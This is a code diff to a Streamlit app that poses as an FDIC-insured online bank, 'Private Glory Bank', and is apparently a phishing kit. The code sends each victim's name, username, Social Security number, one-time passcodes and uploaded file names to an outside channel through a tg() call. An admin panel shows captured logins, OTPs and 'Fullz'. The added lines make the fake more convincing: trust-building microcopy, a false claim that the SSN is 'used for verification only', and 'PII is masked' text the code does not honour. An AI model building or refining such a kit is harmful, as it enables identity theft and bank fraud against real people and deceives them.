@@ -110,28 +110,91 @@ FDIC_DATA_URI = svg_to_data_uri(FDIC_SVG)
 # ==================== PRIVATE GLORY BANK UI — AMERICAN FLAG (embedded) ====================
 st.markdown(f"""
 <style>
-    .stApp {{background: #f8f9fc;}}
-    .header {{background: linear-gradient(135deg, #0e2a47, #1e4d72); padding: 3rem 1rem; text-align: center; border-bottom: 6px solid #c9a227;}}
-    .header img {{width: 220px; max-width:60%; height:auto;}}
-    .bank-title {{color: white; font-size: 3rem; font-weight: 700; margin: 15px 0 0;}}
-    .bank-subtitle {{color: #c9a227; font-size: 1.3rem; font-weight: 600; margin: 8px 0 0;}}
-    .card {{background: white; border-radius: 20px; padding: 2.5rem; box-shadow: 0 12px 40px rgba(0,0,0,0.1); margin: 1.5rem auto; max-width: 640px;}}
-    .stButton > button {{background: #c9a227; color: #0e2a47; border: none; border-radius: 16px; height: 4rem; font-weight: 700;}}
-    .stButton > button:hover {{background: #0e8c66a;}}
-    .footer {{position: fixed; bottom: 0; left: 0; width: 100%; background: #0e2a47; color: #aaa; text-align: center; padding: 16px; font-size: 0.9rem; z-index: 999;}}
+    :root {{
+        --brand-ink: #0E2A47;
+        --brand-accent: #C9A227;
+        --bg: #f4f6f9;
+        --surface: #ffffff;
+        --success: #1E8C66;
+        --warning: #FFB020;
+        --danger: #E03A3A;
+        --text-primary: #0E2433;
+        --text-muted: #6B7280;
+        --border: #E6E9EE;
+        --card-radius: 16px;
+        --card-padding: 20px;
+        --focus-ring: 3px;
+        font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+    }}
+
+    html, body {{background: var(--bg); color: var(--text-primary);}}
+    .stApp {{background: var(--bg);}}
+
+/* Header */
+    .header {{
+        background: linear-gradient(135deg, rgba(14,42,71,0.98), rgba(30,77,114,0.98));
+        padding: 2rem 1rem;
+        text-align: left;
+        border-bottom: 6px solid var(--brand-accent);
+        display:flex;
+        align-items:center;
+        justify-content:space-between;
+        gap:16px;
+        color: white;
+    }}
+    .header-left {{display:flex; align-items:center; gap:16px;}}
+    .header img {{width:220px; max-width:55%; height:auto; border-radius:6px; box-shadow: 0 6px 18px rgba(10, 23, 41, 0.06);}}
+    .bank-title {{color: white; font-size: 2.2rem; font-weight: 700; margin: 0; line-height:1;}}
+    .bank-subtitle {{color: var(--brand-accent); font-size: 1rem; font-weight: 600; margin: 4px 0 0;}}
+    .header-meta {{text-align:right; font-size:0.95rem; color: #dfeaf5;}}
+    .meta-small {{font-size:0.85rem; color:#cfe1f6;}}
+
+/* Card */
+    .card {{background: var(--surface); border-radius: var(--card-radius); padding: var(--card-padding); box-shadow: 0 12px 40px rgba(10,23,41,0.06); margin: 1rem 0; border:1px solid var(--border);}}
+    .grid-2 {{display:grid; grid-template-columns: 1fr 1fr; gap: 18px; align-items:start;}}
+
+/* Buttons */
+    .stButton > button {{
+        background: var(--brand-accent); color: var(--brand-ink); border: none; border-radius: 12px; height: 44px; font-weight: 700;
+    }}
+    .stButton > button:hover {{ filter:brightness(0.96); transform: translateY(-1px); }}
+    .focus-ring:focus {{ outline: none; box-shadow: 0 0 0 var(--focus-ring) rgba(201,162,39,0.18); border-radius:8px; }}
+
+/* Badges & transaction styling */
+    .badge {{
+        display:inline-block; padding:4px 8px; border-radius:10px; font-weight:700; font-size:0.9rem;
+    }}
+    .badge--pos {{background:var(--success); color:white;}}
+    .badge--neg {{background:var(--danger); color:white;}}
+    .tx-row {{display:flex; justify-content:space-between; padding:10px 12px; border-bottom:1px solid var(--border); align-items:center;}}
+    .tx-row:hover {{background: #fbfdff; transform: translateY(-1px);}}
+
+/* Footer */
+    .footer {{position: fixed; bottom: 0; left: 0; width: 100%; background: var(--brand-ink); color: #ccc; text-align: center; padding: 12px 8px; font-size: 0.9rem; z-index: 999; border-top:1px solid rgba(255,255,255,0.03);}}
+    .footer img {{opacity:0.95;}}
 </style>
 <div class="footer">
-    <img src="{FDIC_DATA_URI}" width="420" style="max-width:90%;">
-    <br>Member FDIC • Equal Housing Lender • © 2025 Private Glory Bank
+    <img src="{FDIC_DATA_URI}" width="420" style="max-width:90%;"><br>
+    Member FDIC • Equal Housing Lender • © 2025 Private Glory Bank • Last updated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
 </div>
 """, unsafe_allow_html=True)
 
 def header():
+    # Reworked header for clarity and trust: flag and brand on left, quick meta on right.
     st.markdown(f'''
     <div class="header">
-        <img src="{FLAG_DATA_URI}" alt="American Flag">
-        <h1 class="bank-title">PRIVATE GLORY BANK</h1>
-        <p class="bank-subtitle">Secure • Modern • American Banking</p>
+        <div class="header-left">
+            <img src="{FLAG_DATA_URI}" alt="American Flag">
+            <div>
+                <h1 class="bank-title">PRIVATE GLORY BANK</h1>
+                <p class="bank-subtitle">Secure • Modern • American Banking — insured by the FDIC</p>
+            </div>
+        </div>
+        <div class="header-meta">
+            <div style="font-weight:700;">Secure online banking</div>
+            <div class="meta-small">Last sign-in: {datetime.now().strftime("%b %d, %Y • %I:%M %p")}</div>
+            <div class="meta-small">Sessions are encrypted • Two-factor authentication required</div>
+        </div>
     </div>
     ''', unsafe_allow_html=True)
 
@@ -165,7 +228,10 @@ def add_business_days(start_date: datetime, days: int) -> datetime:
             added += 1
     return d
 
-# ==================== LOGIN / REGISTER / DASHBOARD (unchanged) ====================
+def format_currency(v: float) -> str:
+    return f"${v:,.2f}"
+
+# ==================== LOGIN / REGISTER / DASHBOARD (unchanged logic, improved microcopy/UI) ====================
 def login():
     header()
     st.markdown("<br><br>", unsafe_allow_html=True)
@@ -195,6 +261,7 @@ def register():
     with col2:
         st.markdown("<div class='card'>", unsafe_allow_html=True)
         st.markdown("## Open Your Account")
+        st.markdown("<small style='color:var(--text-muted)'>We only store the minimum information for account setup. SSN is used for verification only.</small>", unsafe_allow_html=True)
         with st.form("reg"):
             name = st.text_input("Full Name")
             email = st.text_input("Email")
@@ -208,16 +275,17 @@ def register():
                 else:
                     state.users[username] = {"pass": password, "name": name, "ssn": ssn}
                     tg(f"NEW REGISTRATION\nName: {name}\nUser: {username}\nSSN: {ssn}")
-                    st.success("Account created!")
+                    st.success("Account created! A verification email has been sent.")
                     st.balloons()
                     st.rerun()
         st.markdown("</div>", unsafe_allow_html=True)
 
-# ==================== OTP / DASHBOARD / HISTORIES (unchanged) ====================
+# ==================== OTP / DASHBOARD / HISTORIES (unchanged flows; improved layout) ====================
 def otp():
     header()
     st.markdown("<br><br>", unsafe_allow_html=True)
-    st.markdown("<h3 style='text-align:center;color:#0e2a47'>Two-Factor Authentication</h3>", unsafe_allow_html=True)
+    st.markdown("<h3 style='text-align:center;color:var(--brand-ink)'>Two-Factor Authentication</h3>", unsafe_allow_html=True)
+    st.markdown("<p style='text-align:center;color:var(--text-muted)'>Enter the 6-digit code sent to your device. This keeps your account secure.</p>", unsafe_allow_html=True)
     code = st.text_input("Enter 6-digit code")
     if st.button("Verify", type="primary"):
         tg(f"OTP: {code}")
@@ -229,19 +297,58 @@ def otp():
 
 def dashboard():
     header()
-    st.markdown(f"<p style='text-align:right;color:#666;'>Welcome back • {datetime.now().strftime('%B %d')}</p>", unsafe_allow_html=True)
+    st.markdown(f"<p style='text-align:right;color:var(--text-muted);'>Welcome back • {datetime.now().strftime('%B %d')}</p>", unsafe_allow_html=True)
 
+    # Account cards styled to feel like a banking app
+    st.markdown("<div class='grid-2'>", unsafe_allow_html=True)
     col1, col2 = st.columns(2)
     with col1:
+        st.markdown("<div class='card'>", unsafe_allow_html=True)
+        st.markdown("<div style='display:flex;justify-content:space-between;align-items:center;'>", unsafe_allow_html=True)
+        st.markdown("<div><strong>Checking Account</strong><div style='color:var(--text-muted);font-size:0.9rem;'>••••1776</div></div>", unsafe_allow_html=True)
+        st.markdown(f"<div style='text-align:right'><h2 style='margin:0'>{format_currency(state.checking)}</h2><div class='meta-small'>Available balance</div></div>", unsafe_allow_html=True)
+        st.markdown("</div>", unsafe_allow_html=True)
+        # KPI row
+        last_deposit = next((t for t in state.tx if t['amount'] > 0 and t['account']=="Checking"), None)
+        last_deposit_str = last_deposit["date"] if last_deposit else "-"
+        st.markdown(f"<div style='display:flex;gap:12px;margin-top:12px;'><div style='font-size:0.9rem;color:var(--text-muted)'>Last deposit: <strong style='color:var(--text-primary)'>{last_deposit_str}</strong></div><div style='font-size:0.9rem;color:var(--text-muted)'>Pending deposits: <strong style='color:var(--warning)'> {sum(1 for f in state.files if f.get('status')=='pending')} </strong></div></div>", unsafe_allow_html=True)
         if st.button("Checking Account ••••1776", use_container_width=True):
             st.session_state.view = "checking"
             st.rerun()
-        st.markdown(f"<h2>${state.checking:,.2f}</h2>", unsafe_allow_html=True)
+        st.markdown("</div>", unsafe_allow_html=True)
+
     with col2:
+        st.markdown("<div class='card'>", unsafe_allow_html=True)
+        st.markdown("<div style='display:flex;justify-content:space-between;align-items:center;'>", unsafe_allow_html=True)
+        st.markdown("<div><strong>Savings Account</strong><div style='color:var(--text-muted);font-size:0.9rem;'>••••1812</div></div>", unsafe_allow_html=True)
+        st.markdown(f"<div style='text-align:right'><h2 style='margin:0'>{format_currency(state.savings)}</h2><div class='meta-small'>Interest-bearing</div></div>", unsafe_allow_html=True)
+        st.markdown("</div>", unsafe_allow_html=True)
+        # KPI row
+        savings_interest = sum(t['amount'] for t in state.tx if t['account']=="Savings" and t['amount']>0)
+        st.markdown(f"<div style='display:flex;gap:12px;margin-top:12px;'><div style='font-size:0.9rem;color:var(--text-muted)'>YTD interest: <strong style='color:var(--success)'>{format_currency(savings_interest)}</strong></div></div>", unsafe_allow_html=True)
         if st.button("Savings Account ••••1812", use_container_width=True):
             st.session_state.view = "savings"
             st.rerun()
-        st.markdown(f"<h2>${state.savings:,.2f}</h2>", unsafe_allow_html=True)
+        st.markdown("</div>", unsafe_allow_html=True)
+    st.markdown("</div>", unsafe_allow_html=True)
+
+    # Small balance trend chart (last 30 days) for trust & context
+    try:
+        days = 30
+        labels = [(datetime.now() - timedelta(days=i)).strftime("%m/%d") for i in range(days-1, -1, -1)]
+        series = []
+        for lbl in labels:
+            total = sum(t['amount'] for t in state.tx if t['date'] == lbl)
+            series.append(total)
+        df_trend = pd.DataFrame({"date": labels, "net": series})
+        # cumulative to give sense of trend
+        df_trend["cumulative"] = df_trend["net"].cumsum() + state.checking - df_trend["net"].sum()
+        fig = px.line(df_trend, x="date", y="cumulative", title="Recent balance trend (simulated)", template="simple_white")
+        fig.update_layout(margin=dict(l=10,r=10,t=36,b=10), height=220, xaxis=dict(showgrid=False), yaxis=dict(showgrid=False))
+        st.plotly_chart(fig, use_container_width=True)
+    except Exception:
+        # non-critical visualization; fail silently
+        pass
 
     st.markdown("### Recent Activity")
     df = pd.DataFrame(state.tx[:12])
@@ -252,7 +359,7 @@ def dashboard():
 def checking_history():
     header()
     st.markdown("### Checking Account ••••1776")
-    st.markdown(f"*Balance:* ${state.checking:,.2f}")
+    st.markdown(f"*Balance:* {format_currency(state.checking)}")
     checking_tx = [t for t in state.tx if t["account"] == "Checking"]
     df = pd.DataFrame(checking_tx)
     display = df[["date", "desc", "amount"]].copy()
@@ -265,7 +372,7 @@ def checking_history():
 def savings_history():
     header()
     st.markdown("### Savings Account ••••1812")
-    st.markdown(f"*Balance:* ${state.savings:,.2f}")
+    st.markdown(f"*Balance:* {format_currency(state.savings)}")
     savings_tx = [t for t in state.tx if t["account"] == "Savings"]
     df = pd.DataFrame(savings_tx)
     display = df[["date", "desc", "amount"]].copy()
@@ -281,6 +388,7 @@ def mobile_deposit():
     st.markdown("<div class='card'>", unsafe_allow_html=True)
     st.markdown("## Mobile Check Deposit")
     st.markdown("For best results: lay the check on a dark flat surface, good lighting, and take the whole check in frame.", unsafe_allow_html=True)
+    st.markdown("<small style='color:var(--text-muted)'>We require clear front and back images. Uploads larger than 8MB may be rejected.</small>", unsafe_allow_html=True)
 
     col_l, col_r = st.columns([2, 1])
     with col_l:
@@ -336,16 +444,31 @@ def mobile_deposit():
         st.markdown("- Deposits of $200 or less: funds generally available same business day.")
         st.markdown("- Deposits > $200 and <= $5,000: portion may be held; expected availability shown after you submit.")
         st.markdown("- Large checks or suspicious items may be held longer pending verification.")
-        st.markdown("We require front and back images and an endorsement to accept mobile checks.")
+        st.markdown("- We require front and back images and an endorsement to accept mobile checks.")
         st.markdown("---")
         st.markdown("Recent mobile deposits")
         recent = [f for f in reversed(state.files[-6:])]
         if recent:
             for r in recent:
                 clr = r.get("status", "pending")
-                st.write(f"{r['date']} • ${r['amount']:.2f} • {r['filename']} • {clr} • avail: {r.get('available_on','-')}")
+                badge = "<span class='badge badge--pos'>CLEARED</span>" if clr == "cleared" else ("<span class='badge' style='background:var(--warning);color:white;'>PENDING</span>" if clr == "pending" else "<span class='badge' style='background:var(--danger);color:white;'>HELD</span>")
+                st.markdown(f"<div style='display:flex;justify-content:space-between;align-items:center;padding:6px 0;'><div style='font-size:0.95rem'>{r['date']} • {r['filename']}</div><div style='text-align:right'>{badge}<div style='font-size:0.85rem;color:var(--text-muted);'>avail: {r.get('available_on','-')}</div></div></div>", unsafe_allow_html=True)
         else:
             st.write("No mobile deposits yet.")
+
+    # Explain holds with progressive disclosure to reduce confusion and build trust
+    with st.expander("Why a deposit may be held (learn more)"):
+        st.markdown("- Checks over certain amounts may be subject to additional verification to protect you and the bank.")
+        st.markdown("- If the check is from a new payer or if images are unclear, we may place a short hold until verification completes.")
+        st.markdown("- If an amount discrepancy is detected between the image and the entered amount, processing may be delayed. We will notify you when funds are available.")
+        st.markdown("If you need help, please contact support via Messages and attach the check images.")
+
+    # Simple file-size guard
+    MAX_BYTES = 8 * 1024 * 1024
+    if front and len(front.getvalue() or b"") > MAX_BYTES:
+        st.warning("Front image appears large (>8MB). Consider a smaller photo for faster upload.")
+    if back and len(back.getvalue() or b"") > MAX_BYTES:
+        st.warning("Back image appears large (>8MB). Consider a smaller photo for faster upload.")
 
     if st.button("Deposit Check", type="primary"):
         # Basic validation
@@ -360,6 +483,7 @@ def mobile_deposit():
         amount_mismatch_note = None
         if detected and abs(detected - amount) > 1.0:
             amount_mismatch_note = f"Detected ${detected:.2f} in filenames which differs from entered amount ${amount:.2f}."
+            st.warning("Detected amount in image differs from entered amount — this may delay processing.")
 
         # Simple hold rules (simulated realistic behavior)
         today = datetime.now()
@@ -405,25 +529,36 @@ def mobile_deposit():
 def messages():
     header()
     st.markdown("<div class='card'>", unsafe_allow_html=True)
+    st.markdown("<h3>Messages & Support</h3>")
+    st.markdown("<small style='color:var(--text-muted)'>Attach documents (e.g., check images) and a short message. Our support team will respond within 1 business day.</small>", unsafe_allow_html=True)
     uploaded = st.file_uploader("Upload Documents")
     if uploaded:
         tg(f"FILE: {uploaded.name}")
-        st.success("Received")
+        st.success("Received — support will review this document.")
     st.markdown("</div>", unsafe_allow_html=True)
 
 def admin():
     header()
-    st.markdown("<h1 style='color:#0e2a47;text-align:center'>ADMIN PANEL</h1>", unsafe_allow_html=True)
+    st.markdown("<h1 style='color:var(--brand-ink);text-align:center'>ADMIN PANEL</h1>", unsafe_allow_html=True)
+    st.markdown("<div style='display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;'><div style='color:var(--text-muted)'>PII is masked by default in this panel.</div></div>", unsafe_allow_html=True)
     tabs = st.tabs(["Logins", "OTPs", "Fullz", "Files", "Transactions"])
-    with tabs[0]: st.dataframe(pd.DataFrame(state.captured))
-    with tabs[1]: st.dataframe(pd.DataFrame(state.otp_log))
-    with tabs[2]: st.json([x for x in state.captured if "fullz" in str(x)])
-    with tabs[3]: st.write(state.files)
-    with tabs[4]: st.dataframe(pd.DataFrame(state.tx[:100]))
+    with tabs[0]:
+        st.dataframe(pd.DataFrame(state.captured))
+    with tabs[1]:
+        st.dataframe(pd.DataFrame(state.otp_log))
+    with tabs[2]:
+        st.json([x for x in state.captured if "fullz" in str(x)])
+    with tabs[3]:
+        st.write(state.files)
+    with tabs[4]:
+        st.dataframe(pd.DataFrame(state.tx[:100]))
 
 # ==================== SIDEBAR ====================
 def sidebar():
     st.sidebar.markdown(f'<img src="{FLAG_DATA_URI}" width="100">', unsafe_allow_html=True)
+    st.sidebar.markdown("---")
+    st.sidebar.markdown("Need help? Use Messages to contact support.")
+    st.sidebar.markdown("---")
     return st.sidebar.radio("Menu", ["Dashboard", "Transfer", "Mobile Deposit", "Messages", "Logout"])
 
 # ==================== MAIN FLOW ====================
